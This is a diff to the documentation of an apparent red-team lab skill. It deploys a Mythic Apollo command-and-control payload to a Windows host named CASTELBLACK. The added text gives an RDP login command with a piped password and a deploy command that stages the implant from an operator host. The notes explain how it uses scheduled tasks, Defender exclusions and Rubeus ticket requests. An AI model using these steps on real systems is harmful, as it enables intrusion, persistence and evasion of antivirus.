@@ -46,6 +46,26 @@ Use Mythic's credential store instead of an environment variable when the creden
   --run-as-credential-realm north.sevenkingdoms.local
 ```
 
+For the clean-baseline CASTELBLACK foothold, use the interactive launch path instead of `auto`. Open an RDP
+session as `NORTH\samwell.tarly`, then launch the staged payload through that active desktop session:
+
+```bash
+printf '%s\n' "$SAGE_RUN_AS_PASSWORD" | xfreerdp3 \
+  /from-stdin:force /u:'NORTH\samwell.tarly' /v:10.4.10.22 \
+  /cert:ignore /sec:nla /w:1024 /h:768 /log-level:ERROR
+```
+
+```bash
+.venv/bin/python skills/sage-mythic-payload-deploy/scripts/deploy_payload_via_ludus.py deploy \
+  --payload-type apollo \
+  --target-host CASTELBLACK \
+  --serve-host 100.x.y.z \
+  --run-as-user 'NORTH\samwell.tarly' \
+  --launch-method scheduled-task-interactive \
+  --add-defender-exclusion \
+  --wait-callbacks-seconds 60
+```
+
 3. Rediscover callbacks with the live-runner skill or Sage task helper after launch. Do not trust historical callback IDs.
 
 ## Script Notes
@@ -55,6 +75,16 @@ Use Mythic's credential store instead of an environment variable when the creden
 - `--serve-host` must be an address reachable from the Windows target. In this lab that is often the operator host's Tailscale IP.
 - `--run-as-credential-account` and `--run-as-credential-realm` resolve a plaintext/password credential from Mythic and do not print the secret.
 - `list-credentials` redacts credential material and is safe to use for account/realm/type discovery.
+- `--launch-method scheduled-task-interactive` waits for an active interactive session for `--run-as-user`, then
+  registers and starts a scheduled task with `LogonType Interactive`. This is the normal clean-baseline
+  CASTELBLACK bootstrap path. Unless overridden with `--remote-path` or `--remote-filename`, it preserves the
+  payload filename on disk, so the normal Apollo path is `C:\Users\Public\apollo.exe`.
+- After a new callback is observed, `scheduled-task-interactive` disconnects the RDP session with `tsdiscon` by
+  default. This closes the local RDP client without logging off the Windows session, so Apollo remains running.
+  Use `--no-disconnect-interactive-session` only when keeping the desktop open is intentional.
+- `--add-defender-exclusion` adds a narrow Defender `ExclusionPath` for only the staged payload file before
+  transfer. Use it only for operator-owned foothold bootstrap on the lab range; clean-baseline Defender otherwise
+  quarantines stock Apollo after it starts.
 - `--launch-method scheduled-task-s4u` creates a passwordless scheduled task with `/NP`. Use it when only a hash exists and the callback needs a local process token for the named domain user; expect no reusable password-backed network logon from that task itself.
 - `--launch-method rubeus-asktgt-netonly` stages `Rubeus.exe`, resolves a hash from Mythic, and runs `asktgt /createnetonly:<payload> /ptt`. Use it when plaintext is unavailable but a hash exists.
 - `--launch-method auto` first tries `Start-Process -Credential` for run-as launches and falls back to a scheduled task if Windows denies that path.
